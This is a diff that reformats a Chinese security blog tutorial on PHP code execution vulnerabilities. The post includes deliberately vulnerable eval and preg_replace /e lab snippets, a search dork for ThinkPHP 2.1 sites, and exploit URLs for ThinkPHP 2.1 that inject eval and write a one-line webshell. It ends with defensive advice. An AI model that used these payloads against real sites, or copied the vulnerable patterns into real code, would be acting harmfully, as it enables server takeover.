@@ -3,7 +3,7 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>代码执行漏洞 - Reber's Blog</title>
+    <title>代码执行漏洞(一) - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,漏洞挖掘,web安全,网络安全,python,php,linux">
     <meta name="description" content="">
     <meta name="author" content="reber">
@@ -77,7 +77,7 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>代码执行漏洞</h2>
+                <h2>代码执行漏洞(一)</h2>
             </div>
             <div class="content">
                 
@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2016-07-25</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -116,25 +117,18 @@
 
 <h3 id="0x00-代码执行">0x00 代码执行</h3>
 
-<blockquote>
-<pre><code>当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，
-没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
-</code></pre>
-</blockquote>
+<p>当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p>
 
 <h3 id="0x01-相关函数">0x01 相关函数</h3>
 
-<blockquote>
 <pre><code>PHP：eval assert
 Python：exec
 asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;
 Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能
 </code></pre>
-</blockquote>
 
 <h3 id="0x02-phpcms中的string2array函数">0x02 phpcms中的string2array函数</h3>
 
-<blockquote>
 <p>这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组</p>
 
 <pre><code>array(  //这个是字符串形式的数组，它并不是数组，而是字符串
@@ -158,29 +152,24 @@ Java：没有类似函数，但采用的反射机制和各种基于反射机制�
         return $array;
 }
 </code></pre>
-</blockquote>
 
 <h3 id="0x03-漏洞危害">0x03 漏洞危害</h3>
 
-<blockquote>
-<pre><code>执行代码
-让网站写shell
-甚至控制服务器
-</code></pre>
-</blockquote>
+<ul>
+<li>执行代码</li>
+<li>让网站写shell</li>
+<li>甚至控制服务器</li>
+</ul>
 
 <h3 id="0x04-漏洞分类-也是利用点">0x04 漏洞分类(也是利用点)</h3>
 
-<blockquote>
 <pre><code>执行代码的函数：eval、assert
 callback函数：preg_replace + /e模式
 反序列化：unserialize()(反序列化函数)
 </code></pre>
-</blockquote>
 
 <h3 id="0x05-漏洞挖掘">0x05 漏洞挖掘</h3>
 
-<blockquote>
 <pre><code>框架找漏洞，如ThinkPHP：
   inurl:index.php intext:ThinkPHP 2.1 { Fast &amp; Simple OOP PHP Framework }
 框架的URL格式如下：
@@ -191,123 +180,72 @@ callback函数：preg_replace + /e模式
   www.yy.com:99/index.php?m=News&amp;f=detail&amp;item=23
   www.zz.com/global_cms_contentview_id_2435
 </code></pre>
-</blockquote>
 
 <h3 id="0x06-搭建环境实验">0x06 搭建环境实验</h3>
 
 <ul>
-<li>示例一</li>
-</ul>
+<li><p>示例一</p>
 
-<blockquote>
 <pre><code class="language-php">&lt;?php
-    $data = $_GET['data'];
-    eval(&quot;\$ret = $data;&quot;);
-    echo $ret;
+$data = $_GET['data'];
+eval(&quot;\$ret = $data;&quot;);
+echo $ret;
 ?&gt;
 </code></pre>
 
+<p><img src="/img/post/code_execution_eval1.png" alt="代码执行漏洞使用eval函数1" /></p></li>
 
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/code_execution_eval1.png" alt="代码执行漏洞使用eval函数1.png">
-</div>
+<li><p>示例二</p>
 
-</blockquote>
-
-<ul>
-<li>示例二</li>
-</ul>
-
-<blockquote>
 <pre><code class="language-php">&lt;?php
-    $data = $_GET['data'];
-    eval(&quot;\$ret = strtolower('$data');&quot;);
-    echo $ret;
+$data = $_GET['data'];
+eval(&quot;\$ret = strtolower('$data');&quot;);
+echo $ret;
 ?&gt;
 </code></pre>
 
+<p><img src="/img/post/code_execution_eval2.png" alt="代码执行漏洞使用eval函数2" /></p></li>
 
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/code_execution_eval2.png" alt="代码执行漏洞使用eval函数2.png">
-</div>
+<li><p>示例三</p>
 
-</blockquote>
-
-<ul>
-<li>示例三</li>
-</ul>
-
-<blockquote>
 <pre><code class="language-php">&lt;?php
-    $data = $_GET['data'];
-    eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);
-    echo $ret;
+$data = $_GET['data'];
+eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);
+echo $ret;
 ?&gt;
 </code></pre>
 
-<p>
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/code_execution_eval3.png" alt="代码执行漏洞使用eval函数3.png">
-</div>
+<p><img src="/img/post/code_execution_eval3.png" alt="代码执行漏洞使用eval函数3" />
+<img src="/img/post/code_execution_eval4.png" alt="代码执行漏洞使用eval函数4" /></p></li>
 
-<br /><br />
+<li><p>示例四</p>
 
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/code_execution_eval4.png" alt="代码执行漏洞使用eval函数4.png">
-</div>
-</p>
-</blockquote>
-
-<ul>
-<li>示例四</li>
-</ul>
-
-<blockquote>
 <pre><code class="language-php">&lt;?php
-    $data = $_GET['data'];
-    eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);
-    echo $ret;
+$data = $_GET['data'];
+eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);
+echo $ret;
 ?&gt;
 </code></pre>
 
-<p>
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/code_execution_eval5.png" alt="代码执行漏洞使用eval函数5.png">
-</div>
+<p><img src="/img/post/code_execution_eval5.png" alt="代码执行漏洞使用eval函数5" />
+<img src="/img/post/code_execution_eval6.png" alt="代码执行漏洞使用eval函数6" /></p></li>
 
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/code_execution_eval6.png" alt="代码执行漏洞使用eval函数6.png">
-</div>
-</p>
-</blockquote>
-
-<ul>
-<li>示例五</li>
-</ul>
-
-<blockquote>
-<p>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])<br />
+<li><p>示例五<br />
+mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])<br />
 /e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)</p>
 
 <pre><code class="language-php">&lt;?php
-    $data = $_GET['data'];
-    $ret = preg_replace('/&lt;data&gt;(.*?)&lt;\/data&gt;/e','$ret = &quot;\\1&quot;',$data);
-    echo $ret;
+$data = $_GET['data'];
+$ret = preg_replace('/&lt;data&gt;(.*?)&lt;\/data&gt;/e','$ret = &quot;\\1&quot;',$data);
+echo $ret;
 ?&gt;
 </code></pre>
 
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/code_execution_preg_replace.png" alt="代码执行漏洞使用preg_replace函数.png">
-</div>
-
-</blockquote>
+<p><img src="/img/post/code_execution_preg_replace.png" alt="代码执行漏洞使用preg_replace函数" /></p></li>
+</ul>
 
 <h3 id="0x07-具体操作">0x07 具体操作</h3>
 
-<blockquote>
 <pre><code># 一般找CMS相应版本漏洞，如ThinkPHP2.1
 * 一句话
     http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}}
@@ -320,7 +258,6 @@ callback函数：preg_replace + /e模式
     http://www.xxx.com/News/detail/id/{${exit(var_dump(file_put_contents($_POST['f'],$_POST[d])))}}
     POST的数据为：f=1.php&amp;d=&lt;?php @eval($_POST['aa'])?&gt;
 </code></pre>
-</blockquote>
 
 <h3 id="0x08-漏洞防御">0x08 漏洞防御</h3>
 
@@ -332,8 +269,7 @@ callback函数：preg_replace + /e模式
 <li>若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象</li>
 </ul>
 
-<p><br />
-下一篇：<a href="http://wyb0.com/posts/code-execution-vulnerabilities-2/">http://wyb0.com/posts/code-execution-vulnerabilities-2/</a></p>
+<h4 id="下一篇-代码执行漏洞-二-posts-code-execution-vulnerabilities-2">下一篇：<a href="/posts/code-execution-vulnerabilities-2/">代码执行漏洞(二)</a></h4>
 
                 
                 <div style="padding:10px 1px;">
